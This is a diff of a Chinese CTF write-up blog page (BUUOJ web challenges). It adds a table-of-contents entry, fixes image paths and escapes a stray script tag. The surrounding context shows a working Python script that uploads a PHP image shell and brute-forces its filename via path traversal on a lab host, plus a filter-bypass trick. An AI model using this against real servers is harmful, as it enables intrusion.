@@ -89,7 +89,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-GYCTF2020-Easyphp"><span class="toc-number">1.</span> <span class="toc-text">0x 01 [GYCTF2020]Easyphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-De1CTF-2019-ShellShellShell"><span class="toc-number">2.</span> <span class="toc-text">0x 02 [De1CTF 2019]ShellShellShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-SUCTF-2019-Upload-Labs-2"><span class="toc-number">3.</span> <span class="toc-text">0x 03 [SUCTF 2019]Upload Labs 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-04-GWCTF-2019-mypassword"><span class="toc-number">4.</span> <span class="toc-text">0x 04 [GWCTF 2019]mypassword</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-05-BSidesCF-2020-Had-a-bad-day"><span class="toc-number">5.</span> <span class="toc-text">0x 05 [BSidesCF 2020]Had a bad day</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-06-N1CTF-2018-easy-harder-php"><span class="toc-number">6.</span> <span class="toc-text">0x 06 [N1CTF 2018]easy_harder_php</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-GYCTF2020-Easyphp"><span class="toc-number">1.</span> <span class="toc-text">0x 01 [GYCTF2020]Easyphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-De1CTF-2019-ShellShellShell"><span class="toc-number">2.</span> <span class="toc-text">0x 02 [De1CTF 2019]ShellShellShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-SUCTF-2019-Upload-Labs-2"><span class="toc-number">3.</span> <span class="toc-text">0x 03 [SUCTF 2019]Upload Labs 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-04-GWCTF-2019-mypassword"><span class="toc-number">4.</span> <span class="toc-text">0x 04 [GWCTF 2019]mypassword</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-05-BSidesCF-2020-Had-a-bad-day"><span class="toc-number">5.</span> <span class="toc-text">0x 05 [BSidesCF 2020]Had a bad day</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-06-N1CTF-2018-easy-harder-php"><span class="toc-number">6.</span> <span class="toc-text">0x 06 [N1CTF 2018]easy_harder_php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-07-SWPUCTF-2016-Web7"><span class="toc-number">7.</span> <span class="toc-text">0x 07 [SWPUCTF 2016]Web7</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -115,7 +115,7 @@
       
         <time datetime="2020-03-25T12:37:11.000Z" itemprop="datePublished">2020-03-25</time>
         
-        (Updated: <time datetime="2020-03-29T17:14:18.065Z" itemprop="dateModified">2020-03-30</time>)
+        (Updated: <time datetime="2020-04-03T03:11:18.292Z" itemprop="dateModified">2020-04-03</time>)
         
       
     </div>
@@ -363,13 +363,13 @@ $country = $mood-&gt;getcountry();</code></pre><p>我们知道此时$mood就是�
 </li>
 </ul>
 <ol>
-<li>SSRF登录参考[De1CTF 2019]ShellShellShell题解，这里记录后续getshell操作。在publish页面存在一个文件上传功能，审计代码发现只能上传图片，而且上传的文件不能有<code>&lt;?php</code>， 这儿可以用<script language="php">代替，文件上传之后是执行一个sh命令如下，我们可以文件包含看看sh文件的内容</li>
+<li>SSRF登录参考[De1CTF 2019]ShellShellShell题解，这里记录后续getshell操作。在publish页面存在一个文件上传功能，审计代码发现只能上传图片，而且上传的文件不能有<code>&lt;?php</code>， 这儿可以用<code>&lt;script language=&#39;php&#39;&gt;</code>代替，文件上传之后是执行一个sh命令如下，我们可以文件包含看看sh文件的内容</li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(move_uploaded_file($uploaded_file,$move_to_file)) &#123;</span><br><span class="line">            if(stripos(file_get_contents($move_to_file),&#39;&lt;?php&#39;)&gt;&#x3D;0)</span><br><span class="line">                system(&#39;sh &#x2F;home&#x2F;nu1lctf&#x2F;clean_danger.sh&#39;);</span><br><span class="line">            return $file_true_name;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
 
 
 
-<p><img src="BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328124926898.png" alt=""></p>
+<p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200328124926898.png" alt></p>
 <p>这儿就需要用到linux的一个小trick了，当我们的文件名是以<code>-</code>开头时这个命令会报错从而让文件保存下来。</p>
 <ol start="2">
 <li>所以我们的思路就是上传一个以<code>-</code>开头的图片码，然后再爆破出上传的文件名，构造shell如下：</li>
@@ -379,7 +379,7 @@ $country = $mood-&gt;getcountry();</code></pre><p>我们知道此时$mood就是�
 <p>爆破文件名脚本如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">time &#x3D; int(time.time())*100</span><br><span class="line"></span><br><span class="line">request_url &#x3D; &#39;http:&#x2F;&#x2F;8ebb02fd-d153-4801-a104-0da7ec58a462.node3.buuoj.cn&#x2F;index.php?action&#x3D;publish&#39;</span><br><span class="line"></span><br><span class="line">cookie &#x3D; &#39;&#39;&#39;PHPSESSID&#x3D;r8gq3bh41h899tuquthqmoefe3&#39;&#39;&#39;</span><br><span class="line">header &#x3D; &#123;</span><br><span class="line">&#39;Cookie&#39;: cookie&#125;</span><br><span class="line">request_file &#x3D; &#123;&#39;pic&#39;:(&#39;-xx.jpg&#39;,open(&#39;D:&#x2F;-xx.jpg&#39;),&#39;image&#x2F;jpeg&#39;)&#125;</span><br><span class="line">res &#x3D; requests.post(url&#x3D;request_url, headers&#x3D;header,files&#x3D;request_file)	# url,data,files</span><br><span class="line">print res.text</span><br><span class="line">print time</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;8ebb02fd-d153-4801-a104-0da7ec58a462.node3.buuoj.cn&#x2F;index.php?action&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;app&#x2F;adminpic&#x2F;-xx&#123;&#125;.jpg&#39;</span><br><span class="line">for i in range(10000):</span><br><span class="line">    tmp &#x3D; time + i</span><br><span class="line">    ul &#x3D; url.format(tmp)</span><br><span class="line">    html &#x3D; requests.get(ul).status_code</span><br><span class="line">    print(html,i)</span><br><span class="line">    if html &#x3D;&#x3D; 200:</span><br><span class="line">        print(ul)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
 
-<p><img src="BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200330011355490.png" alt=""></p>
+<p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200330011355490.png" alt></p>
 <p>参考链接：</p>
 <blockquote>
 <p><a href="https://blog.csdn.net/a3320315/article/details/104088080" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/104088080</a></p>
@@ -405,7 +405,7 @@ $country = $mood-&gt;getcountry();</code></pre><p>我们知道此时$mood就是�
 <blockquote>
 <p>参考资料：<a href="https://tiaonmmn.github.io/2019/09/12/SWPUCTF-2016-Web7/" target="_blank" rel="noopener">https://tiaonmmn.github.io/2019/09/12/SWPUCTF-2016-Web7/</a></p>
 </blockquote>
-</script></li></ol>
+
   </div>
 </article>
 
@@ -432,7 +432,7 @@ $country = $mood-&gt;getcountry();</code></pre><p>我们知道此时$mood就是�
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-GYCTF2020-Easyphp"><span class="toc-number">1.</span> <span class="toc-text">0x 01 [GYCTF2020]Easyphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-De1CTF-2019-ShellShellShell"><span class="toc-number">2.</span> <span class="toc-text">0x 02 [De1CTF 2019]ShellShellShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-SUCTF-2019-Upload-Labs-2"><span class="toc-number">3.</span> <span class="toc-text">0x 03 [SUCTF 2019]Upload Labs 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-04-GWCTF-2019-mypassword"><span class="toc-number">4.</span> <span class="toc-text">0x 04 [GWCTF 2019]mypassword</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-05-BSidesCF-2020-Had-a-bad-day"><span class="toc-number">5.</span> <span class="toc-text">0x 05 [BSidesCF 2020]Had a bad day</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-06-N1CTF-2018-easy-harder-php"><span class="toc-number">6.</span> <span class="toc-text">0x 06 [N1CTF 2018]easy_harder_php</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-GYCTF2020-Easyphp"><span class="toc-number">1.</span> <span class="toc-text">0x 01 [GYCTF2020]Easyphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-De1CTF-2019-ShellShellShell"><span class="toc-number">2.</span> <span class="toc-text">0x 02 [De1CTF 2019]ShellShellShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-SUCTF-2019-Upload-Labs-2"><span class="toc-number">3.</span> <span class="toc-text">0x 03 [SUCTF 2019]Upload Labs 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-04-GWCTF-2019-mypassword"><span class="toc-number">4.</span> <span class="toc-text">0x 04 [GWCTF 2019]mypassword</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-05-BSidesCF-2020-Had-a-bad-day"><span class="toc-number">5.</span> <span class="toc-text">0x 05 [BSidesCF 2020]Had a bad day</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-06-N1CTF-2018-easy-harder-php"><span class="toc-number">6.</span> <span class="toc-text">0x 06 [N1CTF 2018]easy_harder_php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-07-SWPUCTF-2016-Web7"><span class="toc-number">7.</span> <span class="toc-text">0x 07 [SWPUCTF 2016]Web7</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
